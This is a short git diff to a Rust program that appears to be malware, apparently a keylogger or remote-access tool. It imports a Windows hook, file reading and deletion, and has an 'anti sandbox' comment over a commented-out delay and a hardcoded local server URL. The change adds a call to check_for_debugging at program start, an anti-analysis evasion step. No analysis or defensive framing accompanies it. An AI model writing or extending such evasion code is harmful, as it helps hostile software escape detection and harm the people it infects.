@@ -2,7 +2,7 @@ mod server;
 mod system;
 mod encode;
 use std::{sync::Arc, u32};
-use system::{get_windows_version, read_file, set_windows_hook, delete_file};
+use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_debugging};
 use tokio::time::{sleep, Duration, Sleep};
 use std::sync::atomic::{AtomicBool, Ordering};
 use rand::{rngs::StdRng, SeedableRng, Rng};
@@ -24,6 +24,8 @@ async fn main() {
 
     //anti sandbox
     // sleep(Duration::from_secs(600)).await;
+
+    check_for_debugging();
     
     const URL: &'static str = "http://127.0.0.1:5000";
 
